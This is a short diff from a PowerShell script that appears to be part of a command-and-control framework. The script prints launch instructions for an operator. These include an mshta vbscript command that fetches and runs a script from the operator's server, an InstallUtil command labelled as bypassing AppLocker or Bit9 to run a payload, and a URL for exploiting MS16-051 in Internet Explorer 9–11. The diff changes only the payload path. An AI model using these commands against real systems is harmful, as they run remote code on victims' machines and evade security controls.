@@ -1024,7 +1024,7 @@ netsh http add sslcert ipport=0.0.0.0:443 certhash=REPLACE `"appid={00112233-445
     write-host "mshta.exe vbscript:GetObject(`"script:$($ipv4address):$($serverport)/$($downloaduri)_rg`")(window.close)" -ForegroundColor green
     write-host ""
     Write-Host "To Bypass AppLocker or Bit9, use InstallUtil.exe found by SubTee:"
-    write-host "C:\Windows\Microsoft.NET\Framework\v4.0.30319\InstallUtil.exe /logfile= /LogToConsole=false /U posh.exe" -ForegroundColor green
+    write-host "C:\Windows\Microsoft.NET\Framework\v4.0.30319\InstallUtil.exe /logfile= /LogToConsole=false /U $global:newdir\payloads\posh.exe" -ForegroundColor green
     write-host ""
     Write-Host "To exploit MS16-051 via IE9-11 use the following URL:"
     write-host "$($ipv4address):$($serverport)/$($downloaduri)_ms16-051" -ForegroundColor green
